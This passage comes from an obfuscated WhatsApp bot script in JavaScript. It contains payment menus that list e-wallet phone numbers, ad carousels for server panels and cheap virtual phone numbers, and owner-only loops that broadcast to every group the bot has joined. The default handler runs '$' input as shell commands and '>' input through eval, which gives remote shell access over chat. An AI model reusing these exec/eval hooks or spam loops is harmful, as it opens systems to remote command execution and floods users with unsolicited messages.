            name: "single_select",
            buttonParamsJson: "{ \"title\": \"List Payment\", \"sections\": [{ \"title\": \"# Silahkan Pilih Salah Satu Di Bawah Ini\", \"highlight_label\": \"Powered By " + namaowner + "\", \"rows\": [{ \"header\": \"Dana\", \"title\": \"Dana Payment\", \"id\": \".danapay\" }, \n{ \"header\": \"Ovo\", \"title\": \"Ovo Payment\", \"id\": \".ovopay\" }, \n{ \"header\": \"Gopay\", \"title\": \"Gopay Payment\", \"id\": \".gopaypay\" }, \n{ \"header\": \"QRIS\", \"title\": \"QRIS Payment\", \"id\": \".qrispay\" }]}]}"
          };
          const _0x4aaeb6 = {
            buttons: [_0x3f2c27]
          };
          let _0x4a02a6 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x323cc5),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x2c0a0d),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create(_0x4aaeb6)
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0xfff411
          });
          await _0x59b98d.relayMessage(_0x4a02a6.key.remoteJid, _0x4a02a6.message, {
            messageId: _0x4a02a6.key.id
          });
        }
        break;
      case "pay":
        {
          const _0x3c7d7d = "https://files.catbox.moe/8djp6x.jpg";
          const _0x3dceb8 = "https://files.catbox.moe/8djp6x.jpg";
          const _0x560b95 = "https://files.catbox.moe/8djp6x.jpg";
          const _0x569de0 = "https://files.catbox.moe/8djp6x.jpg";
          async function _0x2cf1b6(_0x269260) {
            const _0x38508b = {
              url: _0x269260
            };
            const _0x2d8612 = {
              image: _0x38508b
            };
            const _0x5b23ff = {
              upload: _0x59b98d.waUploadToServer
            };
            const {
              imageMessage: _0x42a51b
            } = await generateWAMessageContent(_0x2d8612, _0x5b23ff);
            return _0x42a51b;
          }
          let _0x8e8435 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {},
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: await _0x2cf1b6(_0x3c7d7d),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "PAYMENT DANA </ Erlangga - Dev />🌐"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_copy",
                          buttonParamsJson: "{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"081511863470\"}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x2cf1b6(_0x3c7d7d),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "PAYMENT GOPAY </ Erlangga - Dev /> OFFICIAL ⚡🌐"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_copy",
                          buttonParamsJson: "{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"088905301692\"}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x2cf1b6(_0x560b95),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "PAYMENT PULSA </ Erlangga - Dev />"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_copy",
                          buttonParamsJson: "{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"082137392620\"}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x2cf1b6(_0x569de0),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "QRIS ALLPAY </ Erlangga - Dev />"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"MINTA AJA)\",\"url\":\"https:\\/\\/wa.me\\/082137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }],
                    messageVersion: 1
                  }
                }
              }
            }
          }, {});
          await _0x59b98d.relayMessage(_0x8e8435.key.remoteJid, _0x8e8435.message, {
            messageId: _0x8e8435.key.id
          });
        }
        break;
      case "danapay":
        {
          if (global.dana == false) {
            return _0x16d835.reply("Payment Dana Tidak Tersedia");
          }
          let _0x5239c1 = "\n*Nomor Dana :*\n" + global.dana + "\n\n*Note :*\nDemi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!\n";
          _0x59b98d.sendText(_0x16d835.chat, _0x5239c1, _0x143656);
        }
        break;
      case "ovopay":
        {
          if (global.ovo == false) {
            return _0x16d835.reply("Payment Ovo Tidak Tersedia");
          }
          let _0x46bdb0 = "\n*Nomor Ovo :*\n" + global.ovo + "\n\n*Note :*\nDemi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!\n";
          _0x59b98d.sendText(_0x16d835.chat, _0x46bdb0, _0x143656);
        }
        break;
      case "gopaypay":
        {
          if (global.gopay == false) {
            return _0x16d835.reply("Payment Gopay Tidak Tersedia");
          }
          let _0x1e87a2 = "\n*Nomor Gopay :*\n" + global.gopay + "\n\n*Note :*\nDemi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!\n";
          _0x59b98d.sendText(_0x16d835.chat, _0x1e87a2, _0x143656);
        }
        break;
      case "qrispay":
        {
          if (global.qris == false) {
            return _0x16d835.reply("Payment Qris Tidak Tersedia");
          }
          _0x16d835.reply("Memproses Mengambil QRIS, Tunggu Sebentar . . .");
          let _0x338dd5 = "\n*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Minta Ke Owner Saja*\n\n*Note :*\nDemi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!\n";
          const _0xce478b = {
            image: global.qris,
            caption: _0x338dd5
          };
          const _0x38dc7f = {
            quoted: _0x143656
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0xce478b, _0x38dc7f);
        }
        break;
      case "jpmslide":
      case "startjpmslide":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          let _0x9b655f = 0;
          let _0x5d5549 = await _0x59b98d.groupFetchAllParticipating();
          let _0x41f715 = Object.entries(_0x5d5549).slice(0).map(_0x1f59c4 => _0x1f59c4[1]);
          let _0x2c00d2 = _0x41f715.map(_0x379285 => _0x379285.id);
          let _0x4c01c = ms(delayjpm * Number(_0x2c00d2.length));
          const _0x42860d = {
            upload: _0x59b98d.waUploadToServer
          };
          let _0xde5fb0 = await prepareWAMessageMedia({
            image: await fs.readFileSync("./media/thumbnail.jpg")
          }, _0x42860d);
          const _0x1b680e = {
            title: "*OPEN PANEL SRV PUBLIC*\n📌1GB CPU 40% 1k/bulan\n📌2GB CPU 60% 2k/bulan\n📌3GB CPU 80% 4k/bulan\n📌4GB CPU 100% 4k/bulan\n📌5GB CPU 120% 5k/bulan\n📌6GB CPU 140% 6k/bulan\n📌7GB CPU 160% 7k/bulan\n📌8GB CPU 180% 8/kbulan\n📌9GB CPU 200% 9k/bulan\n📌UNLI CPU UNLI 10k/bulan\n\nKEUNTUNGAN PANEL:\nBOT ON 24JAM\nTIDAK BOROS KUOTA\nBISA BUAT BOT\nBISA RUN BOT\nBISA BUAT BOT JPM\nDLL\n*READY INSTALL THEMA PANEL : 5-7K*",
            hasMediaAttachment: true,
            ..._0xde5fb0
          };
          const _0x151a29 = {
            title: "*OPEN PANEL SRV PRIVAT*\n*📌1GB CPU 40%*\n_HARGA : RP2.000_\n\n*📌2GB CPU 60%*\n_HARGA : RP3.000_\n\n*📌3GB CPU 80%* \n_HARGA : RP4.000_\n\n*📌4GB CPU 100%* \n_HARGA : RP5.000_\n\n*📌5GB CPU 120%* \n_HARGA : RP6.000_\n\n*📌6GB CPU 140%* \n_HARGA : RP7.000_\n\n*📌7GB CPU 160%* \n_HARGA : RP8.000_\n\n*📌8GB CPU 180%*\n_HARGA : RP9.000_\n\n*📌9GB CPU 200%* \n_HARGA : RP10.000_\n\n*📌UNLI CPU UNLI* \n_HARGA : RP12.00_\n\n*Keuntungan Panel :*\n* Bisa Buat Panel Sepuasnya\n* Bisa Jual Panel Sepuasnya\n* Server *(High Quality)*\n* Bot Auto Fast Respon\n* Garansi Aktif 7 Hari\n* Claim Garansi Wajib Bawa Bukti Transaksi!\n\n*Ready Resseller Panel*\n* *Harga :* Rp10.000/Permanen\n\n*Ready Admin Panel*\n* *Harga :* Rp15.000/Permanen\n\n*Dan Ready Juga Pt panel*\n* *Harga :* Rp25.000/Permanen\n* Create Panel Lewat Bot\n*MINAT?CHAT wa.me/6282137392620*",
            hasMediaAttachment: true,
            ..._0xde5fb0
          };
          const _0x5d5d1b = {
            title: "*OPEN MURNOKOS*\nPRICE: 10K\n\nKEUNTUNGAN MURNOK\nBISA CREATE NOKOS \nBISA DARI BERBAGAI NEGARA\nHARGA MURAH\nDLL",
            hasMediaAttachment: true,
            ..._0xde5fb0
          };
          const _0x340a36 = await generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: "*All Transaksi Open ✅*\n\n*</ Erlangga - Dev />* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
                  }),
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      header: proto.Message.InteractiveMessage.Header.fromObject(_0x1b680e),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + global.owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject(_0x151a29),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + global.owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject(_0x5d5d1b),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/" + global.owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x3abc22("Memproses Mengirim Pesan Slide Teks & Foto Ke *" + _0x2c00d2.length + " Grup*\n\n*Waktu Selsai :*\n" + _0x4c01c.minutes + " menit, " + _0x4c01c.seconds + " detik");
          for (let _0x3e21bf of _0x2c00d2) {
            try {
              await _0x59b98d.relayMessage(_0x3e21bf, _0x340a36.message, {
                messageId: _0x340a36.key.id
              });
              _0x9b655f += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          await _0x16d835.reply("Berhasil Mengirim Pesan Slide Teks & Foto Ke *" + _0x9b655f + " Grup*");
        }
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!_0x1d834a) {
            return _0x16d835.reply(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply("Text mana?\n\nExample : " + (_0x3b78fb + _0x3e5c8f) + " fatih-san");
          }
          let _0x295700 = await _0x59b98d.groupFetchAllParticipating();
          let _0x21afe9 = Object.entries(_0x295700).slice(0).map(_0x449bba => _0x449bba[1]);
          let _0x9708db = _0x21afe9.map(_0x3d2cb5 => _0x3d2cb5.id);
          _0x16d835.reply("Mengirim Broadcast Ke " + _0x9708db.length + " Group Chat, Waktu Selesai " + _0x9708db.length * 1.5 + " detik");
          for (let _0x15a2b3 of _0x9708db) {
            await sleep(1500);
            const _0x1d1e9f = {
              text: "" + _0x43281f
            };
            const _0x295cf2 = {
              quoted: _0x143656
            };
            _0x59b98d.sendMessage(_0x15a2b3, _0x1d1e9f, _0x295cf2);
          }
          _0x16d835.reply("Sukses Mengirim Broadcast Ke " + _0x9708db.length + " Group");
        }
        break;
      case "overcursor":
      case "overbusines":
      case "curse":
      case "ui":
      case "overbeta":
        {
          _0x3abc22("coming soon");
        }
        break;
      default:
        if (_0x4948fa.startsWith("$")) {
          if (!_0x1d834a) {
            return;
          }
          exec(_0x4948fa.slice(2), (_0xc21919, _0x230358) => {
            if (_0xc21919) {
              return _0x59b98d.sendMessage(_0x16d835.chat, {
                text: _0xc21919.toString()
              }, {
                quoted: _0x16d835
              });
            }
            if (_0x230358) {
              return _0x59b98d.sendMessage(_0x16d835.chat, {
                text: util.format(_0x230358)
              }, {
                quoted: _0x16d835
              });
            }
          });
        }
        if (_0x4948fa.startsWith(">")) {
          if (!_0x1d834a) {
            return;
          }
          try {
            let _0x3f9c33 = await eval(_0x43281f);
            if (typeof _0x3f9c33 !== "string") {
              _0x3f9c33 = util.inspect(_0x3f9c33);
            }
            _0x59b98d.sendMessage(_0x16d835.chat, {
              text: util.format(_0x3f9c33)
            }, {
              quoted: _0x16d835
            });
          } catch (_0x3c61c9) {
            _0x59b98d.sendMessage(_0x16d835.chat, {
              text: util.format(_0x3c61c9)
            }, {
              quoted: _0x16d835
            });
          }
        }
        if (_0x4948fa.startsWith("=>")) {
          if (!_0x1d834a) {
            return;
          }
          try {
            const _0x53172f = await eval(";(async () => { " + _0x43281f + " })();");
            return _0x59b98d.sendMessage(_0x16d835.chat, {
              text: util.format(_0x53172f)
            }, {
              quoted: _0x16d835
            });
          } catch (_0x3d3f5f) {
            return _0x59b98d.sendMessage(_0x16d835.chat, {
              text: util.format(_0x3d3f5f)
            }, {
              quoted: _0x16d835
            });
          }
        }
    }
  } catch (_0x7e02ee) {
    console.log(_0x7e02ee);
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});